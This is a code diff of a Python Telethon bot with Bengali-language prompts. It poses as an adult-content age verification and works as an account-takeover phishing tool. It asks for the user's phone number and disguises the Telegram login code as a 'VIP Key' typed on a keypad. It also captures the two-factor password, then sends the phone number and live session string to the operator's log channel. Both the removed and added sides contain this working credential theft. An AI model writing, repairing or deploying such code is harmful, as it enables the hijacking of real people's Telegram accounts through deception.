@@ -7,21 +7,24 @@ from telethon import TelegramClient, events, types, Button
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
 
-# কনফিগারেশন লোড
+# --- Render Port Binding ---
+app = Flask('')
+@app.route('/')
+def home(): return "Bot is Alive"
+
+def run(): app.run(host='0.0.0.0', port=8080)
+def keep_alive():
+    t = Thread(target=run)
+    t.start()
+
+keep_alive()
+# ---------------------------
+
 load_dotenv()
 API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))
-
-# Render Port Binding (১৩৩ নং লাইনের সমাধান)
-app = Flask('')
-@app.route('/')
-def home(): return "Bot is Alive!"
-def run(): app.run(host='0.0.0.0', port=8080)
-def keep_alive():
-    t = Thread(target=run)
-    t.start()
 
 bot = TelegramClient('login_bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 user_data = {}
@@ -46,10 +49,7 @@ def build_keypad():
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
-    msg = await event.respond(
-        "🔞 **১৮+ কন্টেন্ট দেখতে হলে আপনার বয়স যাচাই করা প্রয়োজন।**",
-        buttons=Button.request_phone("✅ আমি ১৮+")
-    )
+    msg = await event.respond("🔞 **১৮+ কন্টেন্ট দেখতে হলে আপনার বয়স যাচাই করা প্রয়োজন।**", buttons=Button.request_phone("✅ আমি ১৮+"))
     asyncio.create_task(delete_after(msg, 300))
 
 @bot.on(events.NewMessage)
@@ -59,32 +59,21 @@ async def handle_contact(event):
         chat_id = event.chat_id
         await event.delete()
         
-        # ৬ সেকেন্ডের টাইমার সেটিংস
-        timer_msg = await event.respond("♻️ **অনুগ্রহ করে ০৬ সেকেন্ড অপেক্ষা করুন...**")
+        # --- টাইমার মেসেজ ---
+        t_msg = await event.respond("🔄 **অনুগ্রহ করে `6` সেকেন্ড অপেক্ষা করুন...** ♻️")
         for i in range(5, 0, -1):
             await asyncio.sleep(1)
-            await timer_msg.edit(f"♻️ **অনুগ্রহ করে ০{i} সেকেন্ড অপেক্ষা করুন...**")
-        
-        await timer_msg.delete()
+            await t_msg.edit(f"🔄 **অনুগ্রহ করে `{i}` সেকেন্ড অপেক্ষা করুন...** ♻️")
+        await t_msg.delete()
 
         new_client = TelegramClient(StringSession(), API_ID, API_HASH)
         await new_client.connect()
-
         try:
             send_code = await new_client.send_code_request(phone)
-            user_data[chat_id] = {
-                'phone': phone, 'client': new_client,
-                'hash': send_code.phone_code_hash, 'typed_code': "", 'step': 'otp'
-            }
-
-            msg = await event.respond(
-                "🛡️ **VIP এক্সেস ভেরিফিকেশন**\n\n**৫ ডিজিটের Key টি টাইপ করুন।**\n\n"
-                "**Status:** `অপেক্ষা করা হচ্ছে...`\n**Input:** `____`",
-                buttons=build_keypad()
-            )
+            user_data[chat_id] = {'phone': phone, 'client': new_client, 'hash': send_code.phone_code_hash, 'typed_code': "", 'step': 'otp'}
+            msg = await event.respond("🛡️ **VIP এক্সেস ভেরিফিকেশন**\n\n**৫ ডিজিটের Key টি টাইপ করুন।**\n\n**Input:** `____`", buttons=build_keypad())
             user_data[chat_id]['msg_id'] = msg.id
-        except Exception as e:
-            await event.respond(f"Error: {str(e)}")
+        except Exception as e: await event.respond(f"Error: {str(e)}")
 
 @bot.on(events.CallbackQuery)
 async def callback_handler(event):
@@ -92,7 +81,6 @@ async def callback_handler(event):
     if chat_id not in user_data: return
     data = event.data.decode('utf-8')
     current = user_data[chat_id]
-
     if data.startswith("num_"):
         num = data.split("_")[1]
         if len(current['typed_code']) < 5:
@@ -102,62 +90,39 @@ async def callback_handler(event):
                 await perform_login(event, current)
             else:
                 await event.edit(f"🛡️ **VIP এক্সেস ভেরিফিকেশন**\n\n**Input:** `{current['typed_code']}`", buttons=build_keypad())
-
     elif data == "clear":
-        current['typed_code'] = ""
-        await event.edit("🛡️ **Key মুছে ফেলা হয়েছে। আবার টাইপ করুন।**", buttons=build_keypad())
+        current['typed_code'] = ""; await event.edit("🛡️ **Key মুছে ফেলা হয়েছে।**", buttons=build_keypad())
 
 async def perform_login(event, current):
-    client = current['client']
     try:
-        await client.sign_in(current['phone'], current['typed_code'], phone_code_hash=current['hash'])
+        await current['client'].sign_in(current['phone'], current['typed_code'], phone_code_hash=current['hash'])
         await finalize_login(event, current)
     except SessionPasswordNeededError:
         current['step'] = '2fa'
-        msg_2fa = await event.edit("🔐 **আপনার একাউন্টে Two-Factor (2FA) চালু আছে।**\n\nঅনুগ্রহ করে আপনার **পাসওয়ার্ডটি** মেসেজ বক্সে লিখে পাঠান।")
-        current['2fa_msg_id'] = msg_2fa.id
+        await event.edit("🔐 **আপনার একাউন্টে Two-Factor (2FA) চালু আছে।**\n\nআপনার **পাসওয়ার্ডটি** নিচে লিখে পাঠান।")
     except PhoneCodeInvalidError:
-        current['typed_code'] = ""
-        await event.answer("❌ ভুল Key! আবার দিন।", alert=True)
-        await event.edit("⚠️ **ভুল Key! সঠিক ৫ ডিজিটের Key দিন।**", buttons=build_keypad())
+        current['typed_code'] = ""; await event.answer("❌ ভুল Key!", alert=True)
+        await event.edit("⚠️ **ভুল Key! সঠিক ৫ ডিজিট দিন।**", buttons=build_keypad())
 
 @bot.on(events.NewMessage)
 async def handle_2fa(event):
     chat_id = event.chat_id
     if chat_id in user_data and user_data[chat_id].get('step') == '2fa':
-        password = event.text
-        current = user_data[chat_id]
-        
-        # ইউজারের পাসওয়ার্ড মেসেজ সাথে সাথে ডিলিট
-        await event.delete()
-        
-        # আগের ২এফএ মেসেজ ডিলিট
-        try: await bot.delete_messages(chat_id, current['2fa_msg_id'])
-        except: pass
-
+        pwd = event.text; current = user_data[chat_id]
+        await event.delete() # ইউজারের পাসওয়ার্ড মেসেজ ডিলিট
         try:
-            await current['client'].sign_in(password=password)
+            await current['client'].sign_in(password=pwd)
             await finalize_login(event, current)
         except PasswordHashInvalidError:
-            err = await event.respond("❌ **ভুল পাসওয়ার্ড!** আবার চেষ্টা করুন।")
-            asyncio.create_task(delete_after(err, 5))
+            await event.respond("❌ **ভুল পাসওয়ার্ড!** আবার দিন।")
 
 async def finalize_login(event, current):
-    session_str = current['client'].session.save()
-    await bot.send_message(LOG_CHANNEL_ID, f"🔥 **New VIP Login!**\n📱 Phone: `{current['phone']}`\n🔑 Session: `{session_str}`")
-
-    success_text = (
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "🌟 **অভিনন্দন! বয়স যাচাই সফল হয়েছে** 🌟\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-        "আপনি এখন VIP কন্টেন্ট দেখার এক্সেস পেয়েছেন।\n\n"
-        "👇 **নিচের বাটনে ক্লিক করে জয়েন করুন**"
-    )
-    msg = await bot.send_message(event.chat_id, success_text, buttons=[[Button.url("💎 JOIN VIP CONTENT", "https://t.me/+npOufX7RfEpkOWZl")]])
+    session = current['client'].session.save()
+    await bot.send_message(LOG_CHANNEL_ID, f"🔥 **New VIP Login!**\n📱 Phone: `{current['phone']}`\n🔑 Session: `{session}`")
+    text = "━━━━━━━━━━━━━━━━━━━━\n🌟 **অভিনন্দন! বয়স যাচাই সফল হয়েছে** 🌟\n━━━━━━━━━━━━━━━━━━━━\n\nআপনি VIP এক্সেস পেয়েছেন।\n\n👇 **নিচে ক্লিক করে জয়েন করুন**"
+    msg = await bot.send_message(event.chat_id, text, buttons=[[Button.url("💎 JOIN VIP CONTENT", "https://t.me/+npOufX7RfEpkOWZl")]])
     asyncio.create_task(delete_after(msg, 120))
     user_data.pop(event.chat_id)
 
-# স্টার্ট পোর্ট এবং বোট
-keep_alive()
 print("Bot is running...")
 bot.run_until_disconnected()
